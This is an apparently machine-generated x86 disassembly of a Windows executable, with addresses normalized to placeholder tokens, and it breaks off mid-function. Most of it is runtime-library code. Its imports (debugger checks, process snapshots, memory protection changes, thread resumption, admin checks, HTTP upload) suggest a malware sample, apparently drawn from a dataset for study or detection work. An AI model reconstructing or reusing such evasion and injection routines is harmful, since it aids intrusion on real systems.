div ebx
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
add eax 0x8
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
mov cl [ ebx ]
cmp cl [ eax ]
jb r-xdata
push ebx
push edi
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ ebx + ebx + 0x8 ]
cmp eax edi
ja r-xdata
mov ecx [ ebp - 0x1c ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
inc eax
inc eax
cmp [ eax ] 0x0
jne r-xdata
cmp cl dl
jbe r-xdata
push edi
call sub_201418b
pop ecx
push ebx
push edi
push [ ebp - 0x2c ]
push [ ebp - 0x20 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringW@IAT ]
mov [ ebp - 0x28 ] eax
push eax
call sub_2009eef
pop ecx
test eax eax
je r-xdata
call sub_2023130
mov edi esp
test edi edi
je r-xdata
inc eax
inc eax
cmp [ eax ] 0x0
jne r-xdata
cmp cl dl
jbe r-xdata
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
jmp r-xdata
test edi edi
je r-xdata
sub_2025237
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_20099ee
push [ ebp + 0x24 ]
mov edx [ ebp + 0x14 ]
push [ ebp + 0x20 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_2024ec7
add esp 0x18
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_2025279
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_20099ee
mov edx [ ebp + 0x10 ]
xor ebx ebx
cmp edx ebx
jne r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_200fb13
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
mov esi 0x7fffffff
cmp edx esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x10 ]
cmp ecx ebx
jne r-xdata
call sub_200fb13
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
jmp r-xdata
push [ eax + 0x8 ]
lea eax [ ebp - 0x10 ]
push edx
push [ ebp + 0xc ]
push edx
push [ ebp + 0x8 ]
push 0x1001
push ecx
push eax
call sub_2025237
add esp 0x20
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200b199
add esp 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
add eax 0xfffffffe
call sub_200fb13
mov [ eax ] 0x16
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_2025373
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_2025279
add esp 0x10
pop ebp
retn
pop ebp
jmp sub_200b28b
sub_202539c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ rw-data ]
jmp r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
push edi
push eax
push [ ebp + 0x8 ]
call sub_2024d9b
add esp 0xc
test eax eax
jne r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
neg eax
add esi 0x4
mov eax [ esi ]
mov al [ edi + eax ]
cmp al 0x3d
je r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
jmp r-xdata
test al al
je r-xdata
pop esi
pop ebp
retn
sub_20253ee
mov edi edi
push ebp
mov ebp esp
push ecx
push edi
mov edi eax
xor eax eax
mov ecx edi
test edi edi
je r-xdata
pop edi
leave
retn
cmp [ edi ] eax
je r-xdata
push esi
inc eax
push 0x4
push eax
call sub_201a9e3
mov esi eax
pop ecx
pop ecx
mov [ ebp - 0x4 ] esi
test esi esi
jne r-xdata
add ecx 0x4
inc eax
cmp [ ecx ] 0x0
jne r-xdata
mov eax [ edi ]
test eax eax
jne r-xdata
push 0x9
call sub_200b6e7
jmp r-xdata
push eax
call sub_2025693
mov [ esi ] eax
add esi 0x4
add edi 0x4
and [ esi ] eax
mov eax [ ebp - 0x4 ]
pop esi
pop ecx
sub_2025448
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
mov [ ebp - 0xc ] ebx
cmp eax ebx
jne r-xdata
push esi
mov esi [ eax ]
push edi
mov [ ebp - 0x4 ] esi
cmp esi ebx
je r-xdata
call sub_200fb13
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_200fb13
mov [ eax ] 0x16
push 0x3d
push esi
call sub_20257a4
mov edi eax
pop ecx
pop ecx
mov [ ebp - 0x14 ] edi
cmp edi ebx
je r-xdata
pop ebx
leave
retn
cmp esi edi
je r-xdata
xor eax eax
cmp [ edi + 0x1 ] bl
sete al
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
cmp eax [ rw-data ]
jne r-xdata
cmp eax ebx
jne r-xdata
call sub_20253ee
mov [ rw-data ] eax
mov esi [ rw-data ]
mov [ ebp - 0x10 ] esi
cmp esi ebx
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
or eax 0xffffffff
sub edi [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_202539c
mov edi eax
cmp edi ebx
pop ecx
jl r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
cmp [ esi ] ebx
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
call sub_201a99e
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
call sub_2024db5
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_2009d98
mov eax [ ebp + 0x8 ]
pop ecx
mov [ eax ] ebx
cmp edi ebx
jge r-xdata
lea esi [ esi + edi * 4 ]
push [ esi ]
call sub_2009d98
pop ecx
cmp [ ebp - 0x8 ] ebx
jne r-xdata
pop edi
pop esi
mov [ eax ] ebx
cmp [ rw-data ] ebx
jne r-xdata
lea eax [ edi + 0x2 ]
cmp eax edi
jl r-xdata
neg edi
cmp [ esi ] ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
jmp r-xdata
push 0x4
call sub_201a99e
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
cmp eax 0x3fffffff
jae r-xdata
mov eax [ esi + 0x4 ]
mov [ esi ] eax
mov eax [ ebp - 0x10 ]
inc edi
lea esi [ eax + edi * 4 ]
cmp edi 0x3fffffff
jae r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
mov [ eax ] ebx
push eax
push 0x4
push [ rw-data ]
call sub_201aa7d
add esp 0xc
cmp eax ebx
je r-xdata
push 0x4
push edi
push [ rw-data ]
call sub_201aa7d
add esp 0xc
cmp eax ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
mov esi [ ebp - 0x4 ]
push 0x1
push esi
call sub_2016140
inc eax
pop ecx
inc eax
push eax
call sub_201a9e3
mov edi eax
pop ecx
pop ecx
cmp edi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea ecx [ eax + edi * 4 ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
mov [ ecx ] ebx
jmp r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_2009d98
mov eax [ ebp + 0x8 ]
pop ecx
mov [ eax ] ebx
push esi
push esi
call sub_2016140
inc eax
pop ecx
inc eax
push eax
push edi
call sub_200a6e1
add esp 0xc
test eax eax
je r-xdata
mov [ rw-data ] eax
mov ecx [ ebp - 0x8 ]
mov eax edi
sub eax esi
add eax [ ebp - 0x14 ]
mov [ eax ] bl
inc eax
neg ecx
sbb ecx ecx
not ecx
and ecx eax
push ecx
push edi
call [ SetEnvironmentVariableA@IAT ]
test eax eax
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_200f929
add esp 0x14
push edi
call sub_2009d98
pop ecx
or [ ebp - 0xc ] 0xffffffff
call sub_200fb13
mov [ eax ] 0x2a
sub_2025693
mov edi edi
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push esi
push edi
push [ ebp + 0x8 ]
call sub_2016140
mov esi eax
inc esi
push esi
call sub_2009eef
mov edi eax
pop ecx
pop ecx
cmp edi ebx
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
push [ ebp + 0x8 ]
push esi
push edi
call sub_200a6e1
add esp 0xc
test eax eax
je r-xdata
pop ebx
pop ebp
retn
mov eax edi
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_200f929
add esp 0x14
pop edi
pop esi
sub_20256e8
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_20099ee
mov eax [ ebp + 0x8 ]
xor ebx ebx
cmp eax ebx
jne r-xdata
push esi
mov esi [ ebp - 0xc ]
cmp [ esi + 0x8 ] ebx
jne r-xdata
call sub_200fb13
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx cx [ eax ]
movzx ecx cx
cmp cx bx
jne r-xdata
push [ ebp + 0xc ]
push eax
call sub_2011f30
pop ecx
pop ecx
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx edx cl
test [ edx + esi + 0x1d ] 0x4
je r-xdata
movzx ecx cx
cmp [ ebp + 0xc ] ecx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop ebx
leave
retn
movzx edx cx
cmp [ ebp + 0xc ] edx
je r-xdata
inc eax
mov dl [ eax ]
cmp dl bl
je r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
inc eax
movzx ecx cx
movzx edx dl
shl ecx 0x8
or ecx edx
cmp [ ebp + 0xc ] ecx
jne r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
dec eax
jmp r-xdata
sub_2025ab0
push edi
push esi
push ebp
xor edi edi
xor ebp ebp
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
inc ebp
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x18 ]
mov ecx eax
mov eax esi
mul [ esp + 0x18 ]
add edx ecx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
dec ebp
jns r-xdata
dec esi
sub eax [ esp + 0x18 ]
sbb edx [ esp + 0x1c ]
cmp edx [ esp + 0x14 ]
ja r-xdata
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
dec edi
jne r-xdata
neg edx
neg eax
sbb edx 0x0
jb r-xdata
pop ebp
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
xor ebx ebx
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_2001000
push 0x5c
push [ esp + 0x8 ]
call sub_200a930
pop ecx
pop ecx
retn
sub_200100e
push r--data
push [ esp + 0x8 ]
call sub_2009fc0
pop ecx
pop ecx
retn
sub_200369b
push 0x0
call sub_200b148
pop ecx
retn
DefWindowProcA
jmp [ DefWindowProcA@IAT ]
sub_20048c5
mov eax [ rw-data ]
mov [ rw-data ] ecx
retn
sub_2004a8d
xor ecx ecx
inc ecx
cmp [ rw-data ] ecx
je r-xdata
retn
test eax eax
je r-xdata
cmp [ eax ] 0x2
jne r-xdata
mov [ eax + 0x1434 ] ecx
sub_200594a
sub esp 0x194
lea eax [ esp ]
push eax
push 0x202
call WSAStartup
neg eax
sbb eax eax
add esp 0x194
retn
sub_20062a0
push eax
call sub_200c1a6
add esp 0x4
retn
sub_20062b0
push 0x0
call sub_200b148
add esp 0x4
retn
sub_20062c0
push r--data
push eax
call sub_200bc6e
add esp 0x8
retn
sub_20062d0
push eax
push ecx
push edx
call sub_200beb0
add esp 0xc
retn
sub_2006320
push 0x0
push eax
push ecx
call [ CopyFileA@IAT ]
retn
sub_2006360
push eax
call [ DeleteFileA@IAT ]
retn
sub_2006600
mov eax 0x1
retn
sub_2006610
push eax
call [ RemoveDirectoryA@IAT ]
retn
sub_2006620
push eax
call [ GetFileAttributesA@IAT ]
xor ecx ecx
cmp eax 0xffffffff
setne cl
mov eax ecx
retn
sub_2006640
push eax
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
jne r-xdata
not al
movzx eax al
shr eax 0x4
and eax 0x1
retn
xor eax eax
retn
sub_2006660
movzx eax [ esp + 0x4 ]
shr eax 0x4
and eax 0x1
retn
sub_2007080
push eax
push ecx
call sub_200c43c
add esp 0x8
retn
sub_2007dd0
call [ IsDebuggerPresent@IAT ]
test eax eax
je r-xdata
call sub_2008b30
cmp [ eax + 0x2 ] 0x0
jne r-xdata
mov eax 0x1
retn
test [ eax + 0x68 ] 0x70
mov eax 0x0
setne al
retn
sub_2007e44
mov eax 0x1
retn
sub_200807e
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x24 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_20083fb
mov eax 0x1
retn
sub_2008401
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_2008484
mov eax 0x1
retn
sub_200848a
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_20084b0
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push ecx
push edx
push eax
call sub_2014c60
retn
sub_20084d0
push rw-data
call [ QueryPerformanceFrequency@IAT ]
call [ GetTickCount@IAT ]
push rw-data
mov [ rw-data ] eax
call [ QueryPerformanceCounter@IAT ]
call [ timeGetTime@IAT ]
mov [ rw-data ] eax
retn
sub_2008600
push ecx
mov eax [ rw-data ]
xor eax esp
mov [ esp ] eax
push 0x0
call [ ExitProcess@IAT ]
sub_2008620
push r--data
call [ GetModuleHandleW@IAT ]
neg eax
sbb eax eax
neg eax
retn
sub_20087dd
mov eax 0x1
retn
sub_20088f0
push eax
push ecx
call sub_200c594
add esp 0x8
retn
sub_2008900
push eax
push ecx
push edx
call sub_200c843
add esp 0xc
retn
sub_2008b30
mov eax [ fs : 0x30 ]
retn
GetSystemDefaultLangID
jmp [ GetSystemDefaultLangID@IAT ]
GetComputerNameA
jmp [ GetComputerNameA@IAT ]
CreateFileA
jmp [ CreateFileA@IAT ]
SetPriorityClass
jmp [ SetPriorityClass@IAT ]
lstrlenA
jmp [ lstrlenA@IAT ]
GetCurrentProcess
jmp [ GetCurrentProcess@IAT ]
GetCurrentThread
jmp [ GetCurrentThread@IAT ]
ExpandEnvironmentStringsA
jmp [ ExpandEnvironmentStringsA@IAT ]
WriteFile
jmp [ WriteFile@IAT ]
Sleep
jmp [ Sleep@IAT ]
CreateProcessA
jmp [ CreateProcessA@IAT ]
TerminateProcess
jmp [ TerminateProcess@IAT ]
GetSystemDirectoryA
jmp [ GetSystemDirectoryA@IAT ]
lstrcatA
jmp [ lstrcatA@IAT ]
SetThreadPriority
jmp [ SetThreadPriority@IAT ]
GetLastError
jmp [ GetLastError@IAT ]
SetLastError
jmp [ SetLastError@IAT ]
GetProcAddress
jmp [ GetProcAddress@IAT ]
CopyFileA
jmp [ CopyFileA@IAT ]
VirtualProtectEx
jmp [ VirtualProtectEx@IAT ]
LoadLibraryA
jmp [ LoadLibraryA@IAT ]
GetSystemInfo
jmp [ GetSystemInfo@IAT ]
GetModuleFileNameA
jmp [ GetModuleFileNameA@IAT ]
GetModuleHandleA
jmp [ GetModuleHandleA@IAT ]
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
GetVersionExA
jmp [ GetVersionExA@IAT ]
CloseHandle
jmp [ CloseHandle@IAT ]
ResumeThread
jmp [ ResumeThread@IAT ]
lstrcpyA
jmp [ lstrcpyA@IAT ]
lstrcmpA
jmp [ lstrcmpA@IAT ]
GetTickCount
jmp [ GetTickCount@IAT ]
TerminateThread
jmp [ TerminateThread@IAT ]
GetExitCodeProcess
jmp [ GetExitCodeProcess@IAT ]
GetEnvironmentVariableA
jmp [ GetEnvironmentVariableA@IAT ]
SetEnvironmentVariableA
jmp [ SetEnvironmentVariableA@IAT ]
CreateThread
jmp [ CreateThread@IAT ]
WaitForSingleObject
jmp [ WaitForSingleObject@IAT ]
GetSystemMetrics
jmp [ GetSystemMetrics@IAT ]
wsprintfA
jmp [ wsprintfA@IAT ]
PostQuitMessage
jmp [ PostQuitMessage@IAT ]
FindWindowA
jmp [ FindWindowA@IAT ]
UpdateWindow
jmp [ UpdateWindow@IAT ]
ShowWindow
jmp [ ShowWindow@IAT ]
__imp_DefWindowProcA
jmp [ DefWindowProcA@IAT ]
CreateWindowExA
jmp [ CreateWindowExA@IAT ]
MessageBoxA
jmp [ MessageBoxA@IAT ]
SetForegroundWindow
jmp [ SetForegroundWindow@IAT ]
RegisterClassExA
jmp [ RegisterClassExA@IAT ]
RegQueryValueExA
jmp [ RegQueryValueExA@IAT ]
RegOpenKeyExA
jmp [ RegOpenKeyExA@IAT ]
RegCloseKey
jmp [ RegCloseKey@IAT ]
IsUserAnAdmin
jmp [ IsUserAnAdmin@IAT ]
gethostbyname
jmp [ gethostbyname@IAT ]
WSACleanup
jmp [ WSACleanup@IAT ]
inet_addr
jmp [ inet_addr@IAT ]
WSAStartup
jmp [ WSAStartup@IAT ]
closesocket
jmp [ closesocket@IAT ]
recv
jmp [ recv@IAT ]
htons
jmp [ htons@IAT ]
InternetWriteFile
jmp [ InternetWriteFile@IAT ]
HttpEndRequestA
jmp [ HttpEndRequestA@IAT ]
HttpAddRequestHeadersA
jmp [ HttpAddRequestHeadersA@IAT ]
sub_2009991
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x24 ] ecx
push eax
push ecx
call sub_200caed
pop ecx
pop ecx
retn
sub_20099a5
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call sub_200ba0a
mov [ ebp - 0x4 ] 0xfffffffe
push eax
call sub_200b9e5
sub_20099c6
mov eax [ ebp - 0x20 ]
jmp sub_20099de
sub_20099cb
xor eax eax
inc eax
retn
sub_20099de
call sub_200db99
retn
_start
call sub_200dd6c
jmp sub_2009866
sub_2009a75
cmp [ ecx + 0xc ] 0x0
je r-xdata
retn
mov eax [ ecx + 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_2009a83
mov eax ecx
retn
sub_2009c63
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200b2e9
add esp 0x10
pop ebp
retn
sub_2009d3c
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_200b3d8
pop ecx
pop ecx
pop ebp
retn
sub_2009d51
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_200b411
pop ecx
pop ecx
pop ebp
retn
sub_2009d66
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200b3f4
add esp 0xc
pop ebp
retn
sub_2009d7f
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200b42d
add esp 0xc
pop ebp
retn
sub_2009dee
push 0x4
call sub_2010d4a
pop ecx
retn
sub_2009e6c
push 0x4
call sub_2010d4a
pop ecx
retn
sub_200a05c
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_2012248
add esp 0x10
pop ebp
retn
sub_200a075
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_200a046
sub_200a080
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_200a05c
sub_200a08b
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_2012545
add esp 0xc
pop ebp
retn
sub_200a0a1
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_2012570
add esp 0x10
pop ebp
retn
sub_200a35f
push [ ebp + 0x8 ]
call sub_2012720
pop ecx
retn
sub_200a369
mov edi edi
push ebp
mov ebp esp
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200a2a5
add esp 0xc
pop ebp
retn
sub_200a5dd
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0xffffffff
push [ ebp + 0x8 ]
call sub_200a3d3
add esp 0x14
pop ebp
retn
sub_200a686
push [ ebp + 0x18 ]
call sub_2012720
pop ecx
retn
sub_200a690
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0xffffffff
push [ ebp + 0x8 ]
call sub_200a5fa
add esp 0x14
pop ebp
retn
sub_200a6ad
mov edi edi
push ebp
mov ebp esp
call sub_200d753
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x14 ] ecx
pop ebp
retn
sub_200a6bf
call sub_200d753
mov ecx [ eax + 0x14 ]
imul ecx ecx 0x343fd
add ecx 0x269ec3
mov [ eax + 0x14 ] ecx
mov eax ecx
shr eax 0x10
and eax 0x7fff
retn
sub_200a923
push [ ebp + 0x14 ]
call sub_2012720
pop ecx
retn
sub_200a95d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
pop ebp
retn
sub_200abf0
push 0x4
call sub_2010d4a
pop ecx
retn
sub_200ae26
push esi
call sub_2012720
pop ecx
retn
sub_200b02f
push [ ebp + 0x8 ]
call sub_2012720
pop ecx
retn
sub_200b13e
push [ ebp + 0x8 ]
call sub_2012720
pop ecx
retn
sub_200b367
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200b2e9
add esp 0x10
pop ebp
retn
sub_200b3d8
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
push sub_200fdd2
call sub_200b381
add esp 0x10
pop ebp
retn
sub_200b3f4
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_200fdd2
call sub_200b381
add esp 0x10
pop ebp
retn
sub_200b411
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
push sub_2014e71
call sub_200b381
add esp 0x10
pop ebp
retn
sub_200b42d
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_2014e71
call sub_200b381
add esp 0x10
pop ebp
retn
sub_200b5e9
call sub_20125d6
add eax 0x20
push eax
push 0x1
call sub_201275c
pop ecx
pop ecx
retn
sub_200b5fc
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_20185ee
add esp 0xc
pop ebp
retn
sub_200b615
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_201860b
add esp 0xc
pop ebp
retn
sub_200b62e
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push eax
push 0x0
push [ ebp + 0x8 ]
call sub_201860b
add esp 0xc
pop ebp
retn
sub_200b646
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_2018628
add esp 0xc
pop ebp
retn
sub_200b65f
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push eax
push 0x0
push [ ebp + 0x8 ]
call sub_2018628
add esp 0xc
pop ebp
retn
sub_200b6a1
mov eax [ rw-data ]
or eax 0x1
xor ecx ecx
cmp [ rw-data ] eax
sete cl
mov eax ecx
retn
sub_200b73b
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_200b710
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_200b753
push 0x8
call sub_2010e3c
pop ecx
retn
sub_200b75c
push 0x8
call sub_2010d4a
pop ecx
retn
sub_200b9ba
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_2010d4a
pop ecx
sub_200b9cf
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_200b8a3
add esp 0xc
pop ebp
retn
sub_200b9e5
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_200b8a3
add esp 0xc
pop ebp
retn
sub_200b9fb
push 0x1
push 0x0
push 0x0
call sub_200b8a3
add esp 0xc
retn
sub_200ba0a
push 0x1
push 0x1
push 0x0
call sub_200b8a3
add esp 0xc
retn
sub_200bbb9
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_201275c
pop ecx
pop ecx
retn
sub_200bbe8
push 0x1
call sub_2010d4a
pop ecx
retn
sub_200bc3a
push [ ebp + 0x8 ]
call sub_2012720
pop ecx
retn
sub_200bc44
push 0x1
call sub_200bb17
pop ecx
retn
sub_200bc6e
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200bc4d
add esp 0xc
pop ebp
retn
sub_200c30d
push esi
call sub_2012720
pop ecx
retn
sub_200c43c
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200c315
add esp 0xc
pop ebp
retn
sub_200c594
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200c453
add esp 0xc
pop ebp
retn
sub_200c65e
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200c5ab
add esp 0x14
pop ebp
retn
sub_200c843
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
